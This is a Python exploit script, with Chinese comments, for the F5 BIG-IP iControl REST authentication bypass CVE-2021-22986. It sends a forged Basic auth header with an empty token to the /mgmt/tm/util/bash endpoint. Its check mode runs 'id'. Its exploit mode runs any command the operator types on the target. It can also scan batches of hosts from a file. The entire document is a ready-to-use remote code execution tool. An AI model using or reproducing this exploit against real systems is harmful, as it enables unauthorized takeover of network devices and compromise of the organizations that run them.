import requests
import sys
import json
import os
import sys
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse


class CVE_2021_22986():
    def __init__(self):
        self.headers = {
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
            "Content-Type": "application/json",
            "X-F5-Auth-Token": "",
            "Authorization": "Basic YWRtaW46QVNhc1M="
        }

    def title(self):
        print('------------------------------------------')
        print('''[+]适用版本：
                F5 BIG-IP 16.x: 16.1.0.3
                F5 BIG-IP 15.x: 15.1.0.4
                F5 BIG-IP 14.x: 14.1.2.6
                F5 BIG-IP 13.x: 13.1.3.4
                F5 BIG-IP 12.x: 12.1.5.2
                F5 BIG-IP 11.x: 11.6.5.2 ''')
        print('[+]使用格式: python poc.py -u url -f 1.txt -e')
        print('[+]使用格式: python poc.py -h 获取帮助')
        print('------------------------------------------')

    #漏洞检测
    def poc(self, target_url):
        url = f'{target_url}/mgmt/tm/util/bash'
        payload = {"command": "run", "utilCmdArgs": "-c id"}
        try:
            res = requests.post(url=url,
                                headers=self.headers,
                                json=payload,
                                verify=False)
            if res.status_code == 200 and 'commandResult' in res.text:
                commandResult = json.loads(
                    res.text)['commandResult'].strip('\n')
                #红色醒目字体
                print(
                    f"\033[31m[!]{target_url} 存在漏洞,响应：{commandResult}\033[0m")
            else:
                print(f'[+]{target_url}不存在漏洞')
        except Exception as e:
            print(f"\033[31m[x]请求出错 ,{e}\033[0m")

    #漏洞利用
    def exp(self, target_url):
        url = f'{target_url}/mgmt/tm/util/bash'
        cmd = input('[+]请输入需要执行的命令 >>> ')
        payload = {"command": "run", "utilCmdArgs": f"-c '{cmd}'"}
        try:
            res = requests.post(url=url,
                                headers=self.headers,
                                json=payload,
                                verify=False)
            if res.status_code == 200 and 'commandResult' in res.text:
                commandResult = json.loads(
                    res.text)['commandResult'].strip('\n')
                #红色醒目字体
                print(
                    f"\033[31m[!]{target_url} 存在漏洞,响应：{commandResult}\033[0m")
            else:
                print(f'[+]{target_url}不存在漏洞')
        except Exception as e:
            print(f"\033[31m[x]请求出错 ,{e}\033[0m")

    def main(self, target_url, file, exec):
        self.title()
        if target_url:
            self.poc(target_url)
            if exec:
                self.exp(target_url)
        if file:
            #读取文件
            for url in args.file:
                #for url in file:
                target_url = url.replace('\n', '')
                self.poc(target_url)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="单个检测，带上http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测")
    parser.add_argument("-e",
                        '--exec',
                        action='store_true',
                        help="执行命令,只针对单个url")
    args = parser.parse_args()
    run = CVE_2021_22986()
    run.main(args.url, args.file, args.exec)
